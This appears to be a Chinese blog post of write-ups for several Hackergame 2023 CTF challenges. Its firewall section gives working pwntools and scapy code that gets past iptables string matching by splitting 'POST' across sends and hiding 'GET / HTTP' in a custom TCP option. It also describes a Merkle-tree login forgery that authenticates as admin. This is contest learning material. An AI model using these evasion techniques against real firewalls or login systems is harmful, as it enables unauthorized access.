---
title: Hackergame 2023题解（三）
id: 8784
date: 2023-11-04 07:47:21
categories: 
  - CTF题解
tags:
  - Hackergame
  - Hackergame 2023
cover: https://blogfiles.oss.fyz666.xyz/jpg/6f00f091-9b5b-42c9-aebd-6635e13518a3.jpg
disableNunjucks: false
---

本文是Hackergame 2023题解的第三部分。

## 🪐 流式星球

{% hideToggle 查看题面 %}
{% note primary simple %}
茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。


你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的流式星人控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。


流式星人用流式数据交流，比如对于视频来说，他们不需要同时纵览整个画面，而是直接使用像素流。为了方便理解，你把这个过程写成了一个 Python 脚本（见附件），flag 就藏在这个视频（见附件）中。尽管最后丢掉了一部分数据，你能把 flag 还原出来吗？

[Python脚本](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/%F0%9F%AA%90%20%E6%B5%81%E5%BC%8F%E6%98%9F%E7%90%83/src/create_video.py)

[视频文件](https://ftp.lug.ustc.edu.cn/~rtxux/0bd1f9a2-ccab-449c-b95c-af57f7ebc91e/video.bin)
{% endnote %}
{% endhideToggle %}
这题的附件给出了将一个mp4文件转换为video.bin的过程。其逻辑是将视频的每一帧抽取出来存入一个array，最后对array做了一个flattern操作并去掉了末尾随机0-99个字符，相当于按顺序存放了视频的每一个像素（仅仅删掉了最后的不到100个）。


用numpy读取video.bin，得到它的长度是135146688，然后我遍历了0-99，加上长度以后送去质因数分解，选出3的倍数再去掉某些存在几千以上质因数的组合后大概有下面几个比较有可能：

```plaintext
135146757 = 3 · 29 · 59 · 113 · 233
135146760 = 3 · 2^3 · 5 · 7 · 349 · 461
135146772 = 3 · 2^2 · 3^2 · 19 · 67 · 983
135146781 = 3 · 3 · 7 · 11 · 23 · 61 · 139
```

手动遍历（没错，我真是手动遍历的），得到下面的组合可以还原视频：

```python
restore_video('video.bin', f'video.mp4', frame_count=3 * 11 * 23, frame_width=7 * 61, frame_height=139)
```

后来发现把高度和帧数搞反了，不过只要宽度正确，就可以在某一帧发现flag。


[解题代码](https://gist.github.com/windshadow233/6a62faa8eb6278b9546b723945c48f36)


## 🪐 低带宽星球
{% hideToggle 查看题面 %}
{% note primary simple %}
茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。


你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的低带宽星人控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。


低带宽星人的通信速度很低，只能以 1 字节 / 天的速度接受信息，所以在这个星球上，你需要将一张图片用很少的字节数传输给低带宽星人，然后获得 flag。具体来说你需要将一张图片无损压缩（每个像素的颜色都一致）：

- 压缩至 2KiB (2048 字节) 及以下，获得 flag1；
- 压缩至 50 字节及以下，获得 flag2。

<a href="https://blogfiles.oss.fyz666.xyz/png/0f282ab8-f6ee-4f41-a0e8-c0c34ff9bc36.png" download="image.png">图片下载</a>

[题目后端环境](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/%F0%9F%AA%90%20%E4%BD%8E%E5%B8%A6%E5%AE%BD%E6%98%9F%E7%90%83/files/image-compressor-backend.zip)
{% endnote %}
{% endhideToggle %}
### 小试牛刀


随便找个在线无损压缩png的网站即可过。


第二题难度上天（强如[mcfx](https://mcfx.us/posts/2023-11-04-hackergame-2023-writeup/#%E4%BD%8E%E5%B8%A6%E5%AE%BD%E6%98%9F%E7%90%83)一开始也没做出来），于是我直接没看～


## Komm, süsser Flagge

{% hideToggle 查看题面 %}
{% note primary simple %}
> Now the flag is all mine
> 
> 
> Can't live without the trust from ip tables


小 Z 写好了一个 flag 服务器，但是他不想让 flag 被轻易地获取，于是他在服务器上设置了一些防火墙规则。如果你的流量不幸被匹配上了，那么你的连接就会被切断。


尽管如此，聪明的小 Q 还是找到办法绕过了精心设计的规则，并偷走了小 Z 的 flag。


小 Z 部署的 iptables 规则如下：


```plaintext
*filter
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:FORWARD DROP [0:0]
:myTCP-1 - [0:0]
:myTCP-2 - [0:0]
:myTCP-3 - [0:0]
-A INPUT -p tcp --dport 18080 -j myTCP-1
-A INPUT -p tcp --dport 18081 -j myTCP-2
-A INPUT -p tcp --dport 18082 -j myTCP-3

-A myTCP-1 -p tcp -m string --algo bm --string "POST" -j REJECT --reject-with tcp-reset

-A myTCP-2 -p tcp -m u32 --u32 "0 >> 22 & 0x3C @ 12 >> 26 @ 0 >> 24 = 0x50" -j REJECT --reject-with tcp-reset

-A myTCP-3 -p tcp -m string --algo bm --from 0 --to 50 --string "GET / HTTP" -j ACCEPT
-A myTCP-3 -p tcp -j REJECT --reject-with tcp-reset
COMMIT
```

所有小题都需要 POST 你的 token 到 /，获取 flag，在没有以上规则的情况下，可以直接使用 curl 获取 flag（需要将 114514:asdfgh== 替换成你的 token）：




```bash
curl -X POST -d "114514:asdfgh==" http://题目地址
```

其中：


- 第一小题位于 `http://202.38.93.111:18080`，对应防火墙规则中的 `myTCP-1` 链；
- 第二小题位于 `http://202.38.93.111:18081`，对应防火墙规则中的 `myTCP-2` 链；
- 第三小题位于 `http://202.38.93.111:18082`，对应防火墙规则中的 `myTCP-3` 链。

{% endnote %}
{% endhideToggle %}

### 我的 POST


第一问iptables检测tcp包中含有POST字符串则直接拒绝连接，那么只要将POST拆开来发送就好了：

```python
from pwn import *

r = remote("202.38.93.111", 18080)
token = 'YOUR_TOKEN_HERE'
data = f"""ST / HTTP/1.1\r
Host: 202.38.93.111\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {len(token)}\r\n\r
{token}""".encode()
r.send(b"PO")
r.send(data)
response = r.recvall()
print(response.decode())

```

### 我的P


不是很看得懂这个规则，注意到0x50正是P的ASCII码，猜测这个规则是在匹配POST当中的字符P。然而不知道为啥直接把第一问的解法改个端口号就过了。


### 我的GET


第三题的iptables只接受前50字节包含"GET / HTTP"的数据包，那么为什么直接在浏览器访问网址也没有响应呢？猜测是这个规则直接把tcp握手给拒了。

于是大部分的工具例如前面的pwntools都不能用了，因为这些工具首先要建立tcp连接才能进行后续操作。我们需要手动构造tcp握手等数据包。那么一个好用的工具就是Python的scapy库。

首先可以在tcp握手的数据包后面接上"GET / HTTP"让握手可以顺利进行，然后再想办法POST数据过去。

```python
from scapy.all import *

target_ip = "202.38.93.111"
target_port = 18082

ip = IP(dst=target_ip)

tcp_syn = TCP(sport=RandShort(), dport=target_port, flags="S") / "GET / HTTP"

syn_ack = sr1(ip / tcp_syn)
```


一开始想的是构造一个伪装成GET的POST请求，然后查到了一个请求头"X-HTTP-Method-Override"，以为可以在这个请求头写上"POST"来覆盖请求方法，结果服务端根本理都不理，这条路就走不通了。


那么就考虑能不能在tcp包上做点手脚。通过拷打ChatGPT，我得到了一个思路。下面是一部分拷打过程：



> 我：tcp报文格式是什么样的
> 
> 
> ChatGPT：TCP（Transmission Control Protocol）报文的格式是由TCP头部和TCP数据部分组成的。下面是TCP头部的详细结构和描述：
> 
> 
> ...
> 
> 
> **选项和填充** (可变长度): 这是一个可选字段，用于传输各种控制和参数信息。
> 
> 
> 我：选项和填充字段最多可以写多少字节？
> 
> 
> ChatGPT：TCP头部的固定部分占用20字节。考虑到TCP头部的最大长度是60字节，因此"选项和填充"字段的最大长度是： 60字节 (TCP头部的最大长度) - 20字节 (TCP头部的固定部分) = 40字节 所以，"选项和填充"字段最多可以占用40字节。这40字节可以完全用于选项，或者部分用于选项并留下一些空间用于填充，以确保整个TCP头部的长度是32位（即4字节）的倍数。
> 
> 
> 我：我想在这里写上自定义的数据，例如"GET / HTTP"，是否可行
> 
> 
> ChatGPT：在TCP头部的"选项和填充"字段中写入自定义数据，如"GET / HTTP"，在理论上是可行的，但存在以下几个问题和挑战：
> 
> 
> ...
> 
> 
> 我：`tcp_post = TCP(sport=syn_ack.dport, dport=target_port, flags="PA", seq=syn_ack.ack, ack=syn_ack.seq + 1) / post_request` 这段代码能不能在TCP报文的最后，例如选项区域、padding区域等 放入一些自定义字符"GET / HTTP"，并且不要影响服务器对post_request数据的解析
> 
> 
> ChatGPT：...
> 
> 
> 基于上述考虑，以下是一个将"GET / HTTP"字符串作为TCP选项的示例：
> ```python
> # 创建一个自定义的TCP选项
> # 假设0xEE是一个未使用的TCP选项编号（在实际环境中，需要确保此值不与现有选项冲突）
> custom_option = (0xEE, "GET / HTTP")
>
> # 构造TCP数据段，其中包括自定义的TCP选项
> tcp_post = TCP(sport=syn_ack.dport, dport=target_port, flags="PA", seq=syn_ack.ack, ack=syn_ack.seq + 1, options=[custom_option]) / post_request
>
> # ... [其余代码保持不变]
> ```

好家伙，跑了一下代码真绕过了iptables。完整代码位于[此gist](https://gist.github.com/windshadow233/6748602d2410b19f4e4e95e01b7c7657)


GPT大法好！


## 为什么要打开 /flag 😡
{% hideToggle 查看题面 %}
{% note primary simple %}

> 至少见一面让我当面道歉好吗？😭我也吓了一跳，没想到事情会演变成那个样子……😭所以我想好好说明一下😭我要是知道就会阻止它们的，但是明明文件描述符都已经关闭了突然间开始 `open()`😭没能阻止大家真是对不起……😭你在生气对吧……😭我想你生气也是当然的😭但是请你相信我。`/flag`，本来没有在我们的预定打开的文件里的😭真的很对不起😭我答应你再也不会随意打开文件了😭我会让各个函数保证再也不打开这个文件😭能不能稍微谈一谈？😭我真的把这里的一切看得非常重要😭所以说，擅自打开 `/flag` 的时候我和你一样难过😭我希望你能明白我的心情😭拜托了。我哪里都会去的😭我也会好好跟你说明我不得不这么做的理由😭我想如果你能见我一面，你就一定能明白的😭我是你的同伴😭我好想见你😭


挽留失败后，她决定在程序启动时做些手脚，让所有访问 /flag 的请求都以某种方式变成打开 /fakeflag 的请求。


「我不会再打开 /flag 了」。真的吗？


（第二小题需要 Linux kernel >= 5.9）

[本题附件](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%89%93%E5%BC%80%20flag%20%F0%9F%98%A1/files/fakeflag-backend.zip)
{% endnote %}
{% endhideToggle %}
### LD_PRELOAD, love!


第一问比较简单，看到fopen、freopen、open等与打开文件相关的函数被修改了逻辑，不过我好像还是做复杂了，搞了半天用了内联汇编来直接调用open系统调用来读取文件。代码见[此链接](https://gist.github.com/windshadow233/af493517bcc7313c61588d65457ff00f)。


第二问就顶不住了，找了很多看上去可以绕过seccomp-unotify的方法，例如ptrace修改系统调用参数等等，但没有一条能成功用上的，最终放弃。


## 异星歧途
{% hideToggle 查看题面 %}
{% note primary simple %}
你降落在荒废星球的角落，开始新的征程，但从科技树底层一步步发展总是令人不快。幸运的是，在看似荒废的土地上仍然留存着高级文明的痕迹：你找到一台冲击反应堆——如果它工作起来，就可以获得用之不尽的电力——尽管它现在没有启动，并且控制工作条件的部件和工厂被 32 个按钮和相连的逻辑系统牢牢掌控。


于是：你的任务是在不进行任何其他操作的情况下拨动这 32 个按钮，使冲击反应堆能够稳定运行。


请点击下方的「打开/下载题目」按钮，下载题目文件。题目文件对应的 Mindustry 版本为 7.0 Build 146。打开游戏后依次选择 地图编辑器—加载地图—选择题目文件 the_planet.msav —返回主菜单，然后选择 开始游戏—自定义游戏—选择导入的名为 the planet 的地图—不改变任何选项点击开始游戏 。开启后的游戏界面如下图，按钮已经用红框标出：


![](https://blogfiles.oss.fyz666.xyz/jpg/b3326a6a-06bc-4d6e-ae82-1221142a0ce5.jpg)
将正确的按钮序列以 01 序列的形式提交至 检查网站 或 nc 202.38.93.111 10071 获得 flag。按钮未按下（即游戏开始时默认状态）用 0 表示，按下（即点击按钮后按钮颜色变亮）用 1 表示，顺序从左到右。


提示：在游戏主菜单选择 设置—图形—显示建筑状态 可以开启建筑状态显示（即图片中建筑右下角的菱形），这可能有助于解题。


提示：为了完成目标，你可能需要以特定的顺序拨动这些按钮，但这不影响结果：只有唯一一组按钮组合能满足要求。如果在满足要求后再次改变按钮，冲击反应堆可能会继续运行一段时间，但会在 1-3 分钟后停止，不可能稳定运行。

[本题附件](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/%E5%BC%82%E6%98%9F%E6%AD%A7%E9%80%94/files/the_planet.msav)

{% endnote %}
{% endhideToggle %}
虽然是个binary题，但不知道和binray有什么关系，纯手玩就过了，这游戏如果认真玩，是一款非常完善的塔防游戏，还挺有意思的！~~（相比于MC，这游戏至少不晕）~~。并且这题在题面说明了“不进行任何其他操作，只需要按32个按钮”，避免了游戏生手浪费大量的时间对游戏进行无谓的摸索，除此以外，还给了一些有利于解题的游戏提示，非常合理与新手友好！


进入游戏可以注意到有32个按钮分为4组，每组控制着1个模块。前两组模块的每个按钮分别是干啥的我根本不懂，不过每组也就256个组合，手试了几下可以找到让前两个模块正常工作的按钮组合：

![](https://blogfiles.oss.fyz666.xyz/png/8b8d2222-44bf-4017-8d98-ca4d8904922c.png)

![](https://blogfiles.oss.fyz666.xyz/png/c218df69-a4f5-439f-90f5-dfc8249aa1b8.png)
第三个模块就比较容易懂了，让钍反应堆多炸几次就可以得出每个按钮处于打开状态时的效果（个人的理解，不一定完全准确）：


1. 将钍慢慢传入反应堆
2. 关闭反向溢流门
3. 关闭反应堆
4. 开启脉冲导管
5. 开启冷冻液混合机
6. 开启抽水机
7. 关闭力墙投影
8. 将钍快速传入反应堆，然后反应堆爆炸

所以我们先开启6和5，为钍反应堆制造冷却液，然后开启1，钍反应堆就可以输出电力了。需要注意的是按钮2必须处于关闭状态，不然制造冷却液的材料会被反向溢流门吃掉（我也不知道这是啥东西，反正关了就对了），然后按钮7好像也不能开启，因为我们需要力墙投影为范围内的所有机械供电来启动。


最后一组按钮各控制着1个电力源：

![](https://blogfiles.oss.fyz666.xyz/png/13677dac-8a8a-4007-883c-5b4c0c6bacfb.png)
随便点了几个但不知道逻辑，遂乱玩，最终发现01110111就能过。


所以4个模块我有3个是穷举出来的。。。


最终效果如下：

![](https://blogfiles.oss.fyz666.xyz/jpg/326091b4-f862-4edd-80b3-8d0fdc44dbcd.jpg)
按钮组合是10100101 11000100 10001100 01110111


看别人的题解发现原来这些按钮背后都有处理器，点开能看到按钮的控制逻辑。


## O(1) 用户登录系统
{% hideToggle 查看题面 %}
{% note primary simple %}
Z 同学是经历过当年三星工厂连连失火，SSD 价格疯涨的苦日子的。


直到如今，Z 同学还是会时常劝诫周围的同学，「1 字 1 位，当思来之不易。半 B 半 D，恒念物力维艰」。


虽然周围的同学由于都是 Linux 用户协会的成员，并不太能理解 Z 同学口中的 D 其实是指 DWORD 的含义，但是大家出于对学长的尊敬还是一脸赞同地深有所悟。


当然，厉行节约绝不是纸上空谈，Z 同学在写代码的过程中也确实对自己硬盘里每一个 bit 的占用都关心备至。比如公钥能用 ECC 绝不会使用 RSA；哈希能用 SHA-1 就不会用 SHA-256；加密能用 ECB 就绝对不用 GCM；压缩能用 ZPAQ 就不会用 LZMA。


而最近，Z 同学在了解 Merkle Tree 之后，惊喜地发现用户登录系统其实可以摆脱掉那些冗杂的数据库系统，无论有多少用户都可以只占用 O(1) 的储存空间，这相当于给 SSD 的价格降低了 O(n) 倍的程度。


「这样的话，既保证了系统的安全性，又再也不怕工厂失火了」，Z 同学一边这样想着，一边把新代码部署上生产环境。


没有感受到任何痛苦，服务器被入侵得很安详。

[本题附件](https://raw.githubusercontent.com/USTC-Hackergame/hackergame2023-writeups/master/official/O%281%29%20%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F/files/o1login.py)
{% endnote %}
{% endhideToggle %}
数据结构学的不扎实，看了半天才发现原来是用列表实现了二叉树的结构。。。相信大一时的我应该可以一眼看出来。随便画了个图来说明本题实现的merkle tree（忽略了hash值的排序）：

![](https://blogfiles.oss.fyz666.xyz/png/64c1c25f-1c69-4d22-90ba-9bad3ba37b23.png)
每个注册用户会获得一串proof字符串，用以验证。这串proof由该用户对应的叶子节点到根节点路径上的所有节点的兄弟节点的sha1值按顺序拼连接起来得到的。例如上图中user1的proof是h2+h6。验证用户是否在树上的逻辑是将proof拆开为多个字节串，然后每爬一层用掉一截proof，求和并计算sha1值，直到用完，若proof用完后得到的sha1值是Merkle Root，则验证通过。


解出flag的条件是在题目阻止我们直接注册admin的条件下，使用admin账户通过认证。


一开始的思路完全放在sha1碰撞上了，可以说是一个很大的误区。


众所周知，虽然sha1确实能碰，但需要极高的算力，恐怕无论是在经济上还是在时间上都不太划算。。。


后来又想着如果某个中间节点正好以"admin:"开头就很舒服，不过这好像就相当于是挖矿了。算了一下"admin:"有6个字节，每个字节有256种可能，由于基本只能靠随机乱猜，相当于平均得算256^6次才能出来一个，好像有点太多了。。。


放了很长时间之后，把思路逆转了过来，既然"admin:"很难成为某个中间节点，那直接让它成为一个虚拟的叶子，然后我们手动去构造一个真实的叶子，让它是"admin:"这个虚拟叶子的父节点似乎就行。


具体而言，可以为`admin`选择一个密码，记为`admin_password`，再设`admin`的兄弟虚拟节点是`user:user_password`，然后计算


`sha1("admin:" + admin_password) + sha1(user + ":" + user_password")`


只要上式有且仅有一个冒号，即这种形式：`aaaa:bbbb`，我们就可以注册一个用户"aaaa"，密码为"bbbb"，使得`admin`成为这棵树虚拟意义上的叶子节点，那么自然就可以通过验证。这里我打算在后面`sha1(user + ":" + user_password)`的计算中碰出这个冒号，于是要求`sha1("admin:" + admin_password)`不能包含冒号。


我们随便选择一个`admin`的密码，组合成一个字符串（由于后面输入时不能打换行符，因此这里`password`还不能带换行符），这个字符串只需要满足经过sha1以后没有冒号即可。（后面发现还需要一个能够进行utf-8 decode的条件，不过也容易碰出来）


我们再随机一个虚拟用户（虚拟叶子`admin`的虚拟兄弟）`user`的密码`user_password`，使得


`sha1(user + ":" + user_password)` 有且仅有一个冒号，且能被utf-8 decode


构造完两个虚拟叶子后，我们用它们生成的父节点就会有且仅有一个冒号，此时我们就可以通过这个冒号将其拆分为一个真实的username和他的password，拿这个账户去注册。


由于至少需要注册两个账号，我们再随便选一个幸运id进行注册。


如此一来，只要`admin`节点可以经过一次proof得到我们注册的第一个用户的sha1，然后就可以使用这位用户的proof来通过后续的验证。


本题代码见[此gist](https://gist.github.com/windshadow233/d9c7d2af6e50c5319870e6ab8c33f646)。


不过我的代码中没有判断两个hash的大小，考虑到题目中对左右hash值的大小顺序有要求，所以如果去碰撞的话，可能需要多试两次。


## 小 Z 的谜题
{% hideToggle 查看题面 %}
{% note primary simple %}

方程之中


变量如锁链相扣


约束交织成网


组合间蕴藏古老的秘密


在变量的森林中追寻


足迹遍历每一个角落


在约束的花丛中舞蹈


影子覆盖每一寸土地


和谐之美指引着方向


我们终将找到自己的答案

[本题附件](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/%E5%B0%8F%20Z%20%E7%9A%84%E8%B0%9C%E9%A2%98/files/puzzle_of_z.py)
{% endnote %}
{% endhideToggle %}
这道题比较有意思，我花了很长时间来理解代码在表述一个什么样的问题，最后发现这是一个“[精确覆盖问题](https://zh.wikipedia.org/wiki/%E7%B2%BE%E7%A1%AE%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98)”要求在边长为5的立方体中恰好堆满一些给定尺寸、数量的长方体。（估计我理解代码花的时间都够大佬们做完这题了）


这个问题其实已经有现成算法了，不过我还是掏出了z3。毕竟题目叫Puzzle of Z嘛！~~（于是前面理解代码的时间相当于白费）~~


注意到Stage 1的排序条件可以直接忽略（求出非排序的解以后手动排个序就好了），其他条件写成z3的约束非常容易。


对于最后一个条件，相当于是统计每种形状长方体的数量。由于我们可以任意对解排序，所以可以直接写死一种顺序，按这个顺序来写约束即可。


于是轻松拿到flag1，后面两个flag要求解满足某种我理解不能的score条件，本想着多跑几次看看能不能运气好跑出来，不过我跑了好几次，发现它每次跑出来的都是同一个解。最后想了一个办法：为了得到更多的解，可以在每次求出解后作为新的约束给它添加上去，然后再求解一次。以此循环，在得到800多个解以后，终于集齐了3个flag所需要的解。


解题代码见[此gist](https://gist.github.com/windshadow233/5743065783bbb16f2d19b352f1128ce3)
